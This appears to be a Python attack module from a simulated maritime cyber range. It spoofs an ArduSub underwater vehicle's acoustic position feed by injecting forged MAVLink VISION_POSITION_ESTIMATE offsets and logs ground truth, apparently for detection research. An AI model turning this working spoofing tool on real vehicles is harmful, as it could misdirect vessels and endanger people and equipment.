"""
WO-16: Acoustic-positioning spoofing -- the SUBMERGED analog of GPS spoofing.

Why this exists (investigated live, not assumed): a submerged AUV gets no GPS
(RF doesn't penetrate water). ArduSub's default config confirms it -- the
BlueROV2 uses EK3_SRC1_POSXY = 6 (ExternalNav), NOT GPS, for horizontal
position. Its absolute position while submerged comes from an acoustic
positioning system (USBL/LBL/DVL), fed into ArduPilot as VISION_POSITION_ESTIMATE
(MAVLink #102). Spoofing GPS or the FDM position field therefore does nothing to
a submerged AUV (verified: GPS_RAW_INT ignores an FDM-position ramp). The real
attack surface underwater is that acoustic-positioning feed.

This module plays BOTH the legitimate acoustic-positioning provider AND the
attacker on the same channel -- exactly like attacks/gps_spoof.py is a relay
that's transparent when off and injects an offset when on:
  * spoof OFF  -> feeds the AUV's TRUE position (read from Gazebo) via
                  VISION_POSITION_ESTIMATE == a working USBL/DVL. This is also
                  what gives the submerged AUV a valid horizontal fix at all
                  (without an external-nav feed its GLOBAL_POSITION_INT is 0,0).
  * spoof ON   -> feeds TRUE + a forged offset, so the AUV's BELIEVED position
                  diverges from its true Gazebo position -- the acoustic analog
                  of walking the surface vessel's GPS off with gps_spoof.

Frames: Gazebo world is ENU (x=East, y=North, z=Up); VISION_POSITION_ESTIMATE is
NED relative to the EKF origin (x=North, y=East, z=Down). So
  N = gazebo_y,  E = gazebo_x,  D = -gazebo_z.

Connection: talks straight to ArduSub's spare MAVLink port (SERIAL1, tcp:5762 by
default) so it doesn't contend with the dashboard/bridge. Override with
MCR_ACOUSTIC_ENDPOINT.

USAGE:
  MCR_VEHICLE_PROFILE=bluerov2 python3 attacks/acoustic_spoof.py
Interactive: 'step' | 'ramp' | 'off' | 'quit' (same verbs as gps_spoof).
"""
import os
import re
import sys
import csv
import math
import time
import threading
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import constants
from pymavlink import mavutil

ENDPOINT = os.environ.get("MCR_ACOUSTIC_ENDPOINT", "tcp:127.0.0.1:5762")
ODOM_TOPIC = os.environ.get("MCR_ACOUSTIC_ODOM_TOPIC", f"/model/{constants.MODEL_NAME}/odometry")

ATTACK_LOG_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "attack_logs", "acoustic_spoof_ground_truth.csv")
os.makedirs(os.path.dirname(ATTACK_LOG_PATH), exist_ok=True)
_log_lock = threading.Lock()


def log_attack_event(wall_ts, mode, true_n, true_e, forged_n, forged_e):
    with _log_lock:
        write_header = not os.path.exists(ATTACK_LOG_PATH)
        with open(ATTACK_LOG_PATH, "a", newline="") as f:
            w = csv.writer(f)
            if write_header:
                w.writerow(["wall_ts", "mode", "true_north_m", "true_east_m",
                            "forged_north_m", "forged_east_m"])
            w.writerow([wall_ts, mode, true_n, true_e, forged_n, forged_e])


class SpoofState:
    def __init__(self):
        self.active = False
        self.mode = None                 # "step" | "ramp"
        self.start_time = None
        self.step_offset_m = 50.0
        self.ramp_rate_m_per_s = 0.5
        self.direction_deg = 90.0        # bearing of the forged offset (0=N, 90=E)


state = SpoofState()
_lock = threading.Lock()


def compute_offset_m():
    with _lock:
        if not state.active:
            return 0.0, 0.0
        mode, start = state.mode, state.start_time
        step, rate, bearing = state.step_offset_m, state.ramp_rate_m_per_s, state.direction_deg
    magnitude = step if mode == "step" else (rate * (time.time() - start) if mode == "ramp" else 0.0)
    br = math.radians(bearing)
    return magnitude * math.cos(br), magnitude * math.sin(br)  # (north, east)


# --- true pose from Gazebo (ENU) -> NED --------------------------------------
def _field(block, name, default=0.0):
    m = re.search(rf"{name}:\s*([-+\d.e]+)", block)
    return float(m.group(1)) if m else default


def read_true_ned(proc_holder):
    """Yields (N, E, D, yaw_ned_rad) from the AUV's true Gazebo odometry,
    continuously. yaw_ned_rad is the vehicle's true compass heading (0 =
    north, clockwise-positive, i.e. the convention VISION_POSITION_ESTIMATE
    expects).

    Both REMUS-100 twins set EK3_SRC1_YAW=6 -- VISION_POSITION_ESTIMATE is
    their YAW source too, not just position. A caller that ignores this
    field and always sends yaw=0.0 silently tells the EKF "the vehicle is
    always facing north," fighting its real heading estimate the moment it
    turns. Root-caused live 2026-08-10 as the actual cause of the AUV
    waypoint-tracking bug documented in EXECUTION_STATE.md's 2026-08-09
    dry-run entry (previously misdiagnosed there as untuned PSC_* position-
    controller gains -- that diagnosis didn't hold up: PSC_POSXY_P/
    PSC_VELXY_* are pre-4.x parameter names that don't exist in this
    firmware build and silently no-op, confirmed live via PARAM_REQUEST_READ
    returning nothing for them, so the twins were always running ArduSub's
    plain default gains, not "BlueROV2's gains." Confirmed instead: at rest,
    ArduPilot's own ATTITUDE.yaw read ~0 rad while Gazebo's true yaw for the
    same instant was ~1.78 rad (~102 deg) -- exactly the corruption this
    fix removes.
    """
    proc = subprocess.Popen(["gz", "topic", "-e", "-t", ODOM_TOPIC],
                            stdout=subprocess.PIPE, text=True)
    proc_holder["proc"] = proc
    block = ""
    depth = 0
    in_pose = False
    for line in proc.stdout:
        if not in_pose:
            if "pose {" in line:
                in_pose = True; block = ""; depth = 1
            continue
        depth += line.count("{") - line.count("}")
        block += line
        if depth <= 0:
            in_pose = False
            # Gazebo's protobuf text format omits any field equal to its
            # default (0.0) -- requiring x/y/z to all literally appear as
            # text silently dropped every pose where the AUV was exactly
            # on one of those axes (same bug already found and fixed
            # 2026-08-09 in ais_emulator.py, dashboard_server.py, and
            # run_attack_suite.py -- missed here until now). Default a
            # missing field to 0.0 (its real value) instead of requiring
            # a match, and widen the exponent character class so a
            # positive-exponent value ("1.23e+05") doesn't get truncated.
            # Extract the position and orientation sub-blocks separately --
            # both use the same x/y/z field names, so searching the whole
            # combined block would silently grab whichever occurs first.
            pm = re.search(r"position\s*\{(.*?)\}", block, re.S)
            om = re.search(r"orientation\s*\{(.*?)\}", block, re.S)
            pblock = pm.group(1) if pm else ""
            oblock = om.group(1) if om else ""
            gx = _field(pblock, "x")
            gy = _field(pblock, "y")
            gz = _field(pblock, "z")
            qx = _field(oblock, "x")
            qy = _field(oblock, "y")
            qz = _field(oblock, "z")
            qw = _field(oblock, "w")
            # Gazebo orientation is ENU (yaw measured CCW from East, about
            # the Up axis). VISION_POSITION_ESTIMATE wants a NED compass
            # heading (0=North, CW-positive): yaw_ned = pi/2 - yaw_enu.
            yaw_enu = math.atan2(2.0 * (qw * qz + qx * qy), 1.0 - 2.0 * (qy * qy + qz * qz))
            yaw_ned = (math.pi / 2.0 - yaw_enu + math.pi) % (2.0 * math.pi) - math.pi
            yield (gy, gx, -gz, yaw_ned)  # N, E, D, yaw


# --- feed loop ---------------------------------------------------------------
def run_feed(conn):
    """Continuously feeds VISION_POSITION_ESTIMATE (true position + any active
    spoof offset). Transparent USBL when spoof is off; false position when on."""
    # EKF needs an origin to map local NED -> global lat/lon.
    conn.mav.set_gps_global_origin_send(
        conn.target_system, int(constants.HOME_LAT * 1e7), int(constants.HOME_LON * 1e7), 0)
    print(f"Acoustic-positioning feed live on {ENDPOINT}. Spoof OFF (transparent USBL).")
    print("Commands: step | ramp | off | quit")
    holder = {}
    last_log = 0.0
    for (tn, te, td, tyaw) in read_true_ned(holder):
        off_n, off_e = compute_offset_m()
        fn, fe = tn + off_n, te + off_e
        us = int(time.time() * 1e6)
        # yaw is the AUV's real heading, never spoofed -- this attack forges
        # position only (see module docstring); a false heading would corrupt
        # navigation independent of and unrelated to the position offset.
        conn.mav.vision_position_estimate_send(us, fn, fe, td, 0.0, 0.0, tyaw)
        with _lock:
            active, mode = state.active, state.mode
        if active and time.time() - last_log > 0.5:
            log_attack_event(time.time(), mode, tn, te, fn, fe)
            last_log = time.time()


def control_cli():
    while True:
        cmd = input("> ").strip().lower()
        if cmd == "step":
            with _lock:
                state.mode = "step"; state.start_time = time.time(); state.active = True
            print(f"STEP acoustic spoof ON: +{state.step_offset_m} m at bearing {state.direction_deg}")
        elif cmd == "ramp":
            with _lock:
                state.mode = "ramp"; state.start_time = time.time(); state.active = True
            print(f"RAMP acoustic spoof ON: {state.ramp_rate_m_per_s} m/s at bearing {state.direction_deg}")
        elif cmd == "off":
            with _lock:
                state.active = False
            print("Acoustic spoof OFF -- feeding true position (legitimate USBL).")
        elif cmd == "quit":
            os._exit(0)
        else:
            print("Commands: step | ramp | off | quit")


def connect():
    print(f"Connecting to ArduSub at {ENDPOINT} ...")
    conn = mavutil.mavlink_connection(ENDPOINT, source_system=1, source_component=197)
    if conn.wait_heartbeat(timeout=20) is None:
        print(f"ERROR: no heartbeat on {ENDPOINT}")
        sys.exit(1)
    print(f"Connected to system {conn.target_system}.")
    return conn


if __name__ == "__main__":
    conn = connect()
    t = threading.Thread(target=run_feed, args=(conn,), daemon=True)
    t.start()
    control_cli()
